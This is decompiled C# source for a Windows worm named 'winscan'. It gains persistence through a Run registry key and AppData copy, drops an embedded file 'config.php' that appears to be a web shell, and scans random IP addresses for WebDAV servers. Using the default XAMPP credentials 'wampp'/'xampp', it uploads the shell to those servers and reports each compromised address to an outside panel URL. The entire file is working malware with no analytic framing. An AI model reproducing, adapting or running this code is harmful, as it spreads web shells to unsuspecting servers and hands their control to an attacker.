using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using winscan.My;
using winscan.My.Resources;

namespace winscan;

[StandardModule]
internal sealed class Module1
{
	private static string ShellPath = Interaction.Environ("AppData") + "\\config.php";

	private static string PanelURL = "http://fyihosting.co.cc/webdav.php";

	public static void wdUpload(string IP, string shellFile)
	{
		try
		{
			string text = IP + "config.php";
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
			httpWebRequest.Credentials = new NetworkCredential("wampp", "xampp");
			httpWebRequest.PreAuthenticate = true;
			httpWebRequest.Method = "PUT";
			httpWebRequest.Headers.Add("Translate: f");
			httpWebRequest.Timeout = 60000;
			httpWebRequest.SendChunked = true;
			httpWebRequest.KeepAlive = false;
			httpWebRequest.AllowWriteStreamBuffering = true;
			byte[] array = File.ReadAllBytes(shellFile);
			httpWebRequest.ContentLength = array.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			requestStream.Dispose();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			httpWebResponse.Close();
			WRequest(text);
		}
		catch (WebException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object WRequest(string URL)
	{
		string result = "";
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(PanelURL + "?ip=" + URL);
			httpWebRequest.Accept = "*/*";
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.UserAgent = "http_requester/0.1";
			httpWebRequest.Timeout = 60000;
			httpWebRequest.Method = "GET";
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			if (httpWebResponse.StatusCode == HttpStatusCode.OK)
			{
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				result = streamReader.ReadToEnd();
			}
			httpWebResponse.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void Scan()
	{
		while (true)
		{
			string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"http://", IP()), (object)"/webdav/"));
			try
			{
				byte[] bytes = Encoding.ASCII.GetBytes("");
				HttpWebRequest httpWebRequest = WebRequest.Create(text) as HttpWebRequest;
				httpWebRequest.Method = "POST";
				httpWebRequest.ContentType = "application/x-www-form-urlencoded";
				httpWebRequest.ContentLength = bytes.Length;
				httpWebRequest.Timeout = 5000;
				Stream requestStream = httpWebRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				httpWebRequest.GetResponse();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				if (ex2.ToString().Contains("401"))
				{
					wdUpload(text, ShellPath);
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private static object IP()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 212:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0009:
					num = 2;
					VBMath.Randomize();
					break;
					end_IL_0001_2:
					break;
				}
				num = 3;
				obj = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 230f) + 25f) + "." + Conversions.ToString(Conversion.Int(VBMath.Rnd() * 255f) + 1f) + "." + Conversions.ToString(Conversion.Int(VBMath.Rnd() * 255f) + 1f) + "." + Conversions.ToString(Conversion.Int(VBMath.Rnd() * 255f) + 1f);
				break;
				end_IL_0001:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0001_dispatch = 212;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static List<Thread> RunThreads(int count, ThreadStart start)
	{
		List<Thread> list = new List<Thread>();
		checked
		{
			int num = count - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				VBMath.Randomize();
				Thread.Sleep((int)Math.Round(Conversion.Int(VBMath.Rnd() * 100f)));
				Thread thread = new Thread(start);
				thread.Start();
				list.Add(thread);
				num2++;
			}
			return list;
		}
	}

	[STAThread]
	public static void Main()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 184:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_002e;
						case 4:
							goto IL_0068;
						case 5:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0068:
					num = 4;
					File.WriteAllBytes(ShellPath, Resources.config);
					break;
					IL_002e:
					num = 3;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("WinScan", Interaction.Environ("AppData") + "\\winscan.exe");
					goto IL_0068;
					IL_0009:
					num = 2;
					File.Copy(Assembly.GetExecutingAssembly().Location, Interaction.Environ("AppData") + "\\winscan.exe");
					goto IL_002e;
					end_IL_0001_2:
					break;
				}
				num = 5;
				RunThreads(3, Scan);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 184;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
